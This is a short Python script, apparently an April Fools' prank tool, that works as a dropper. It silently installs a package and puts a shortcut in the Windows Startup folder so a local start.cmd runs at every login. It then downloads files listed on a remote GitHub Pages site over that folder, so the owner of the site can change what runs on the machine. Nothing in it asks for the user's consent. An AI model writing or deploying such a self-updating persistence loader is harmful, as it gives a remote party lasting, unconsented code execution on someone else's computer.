import urllib.request
import time
import os
# from importlib import reload
# import update as update_m

def access(url, test):# repeatly try to get the page at 10s/tries
    while True:
        try:
            page = urllib.request.urlopen(url)
            if test:
                print("Successfully read " + url)
            break
        except:
            if test:
                print("Fail to access " + url)
            time.sleep(10)
    return page

path = r"D:\New folder\\"
os.makedirs(path, exist_ok = True)
try:
    from swinlnk.swinlnk import SWinLnk
except:
    os.system("py -m pip install swinlnk")
    from swinlnk.swinlnk import SWinLnk
swl=SWinLnk()
swl.create_lnk(path+"start.cmd",os.getenv("appdata")+r"\Microsoft\Windows"+
               r"\Start Menu\Programs\Startup\start.lnk")
def update(test =False):# update all code
    vUrl = access("https://albertlin2288.github.io/april_fool/version.txt",
                  test)
    version = int(vUrl.read().decode().strip())
    try:
        with open(path + "version.txt") as file:
            my_version = int(file.read().strip())
    except:
        my_version = -1
    print(version,my_version)
    if my_version < version:
        adUrl = access("https://albertlin2288.github.io/april_fool/address.txt",
                       test)
        address = adUrl.read().decode().strip()
        for i in address.split("\n"):
            program_ad = access(i.split(" ")[1], test)
            with open(path + i.split(" ")[0], "w") as file:
                file.write(program_ad.read().decode())
        with open(path + "version.txt", "w") as file:
            file.write(str(version))

if __name__ == "__main__":
    update(1)
